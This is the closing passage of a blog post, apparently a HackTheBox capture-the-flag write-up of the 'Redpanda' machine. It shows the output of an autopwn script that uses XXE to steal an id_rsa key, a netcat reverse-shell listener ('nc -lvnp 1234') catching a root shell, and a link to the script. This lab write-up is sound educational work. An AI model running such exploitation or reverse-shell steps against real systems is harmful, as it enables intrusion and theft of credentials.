</pre><td class="rouge-code"><pre><span class="go">❯ python3 autopwn.py -i 10.10.14.88 -p 1234
[▗] Starting attack: Starting reverse shell process
[*] workstation created
[*] .jpg uploaded
[*] .xml uploaded
[*] logs uploaded
[*] web server uploaded
[+] Files uploaded.
[+] Successful XXE attack.
[+] id_rsa_file downloaded

[+] Open port 1234 to receive shell. (e.g nc -lvnp 1234)
Press to continue...

────────────────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.11.170.
Ncat: Connection from 10.10.11.170:39660.
bash: cannot set terminal process group (3930): Inappropriate ioctl for device
bash: no job control in this shell
</span><span class="gp">root@redpanda:~#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">find / -name root.txt | xargs ls -l
-rw-r----- 1 root root 33 Sep 23 04:50 /root/root.txt
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Redpanda/autopwn/autopwn.py">https://github.com/E1P0TR0</a></p></div></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a> <a href="/tags/ssti/" class="post-tag no-text-decoration" >SSTI</a> <a href="/tags/xxe/" class="post-tag no-text-decoration" >XXE</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Redpanda - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBRedpanda/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Redpanda - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBRedpanda/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBRedpanda/&amp;text=Hackthebox Writeup Redpanda - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBLate/"><div class="card-body"> <em class="timeago small" data-ts="1652136193" > 2022-05-09 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Late</h3><div class="text-muted small"><p> Máquina Linux donde al enumerar encontramos un servicio web abierto que aplicaba Virtual Hosting y nos permitia llegar a otra web con un programa para convertir imágenes a texto Optical Character R...</p></div></div></a></div><div class="card"> <a href="/posts/HTBMetaTwo/"><div class="card-body"> <em class="timeago small" data-ts="1668574637" > 2022-11-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Metatwo</h3><div class="text-muted small"><p> Overview Worpress credentials by Unauthenticated SQL Injection (CVE-2022-0739) FTP credentials by Authenticated XXE Within the Media Library (CVE-2021-29447) SSH login by Information leak i...</p></div></div></a></div><div class="card"> <a href="/posts/HTBNodeBlog/"><div class="card-body"> <em class="timeago small" data-ts="1689958800" > 2023-07-21 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NodeBlog Tools</h3><div class="text-muted small"><p> Python Script With the script you gain full access to machine, read files and bruteforce admin login password: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 3...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBTrick/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Trick</p></a> <a href="/posts/HTBShoppy/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Shoppy</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
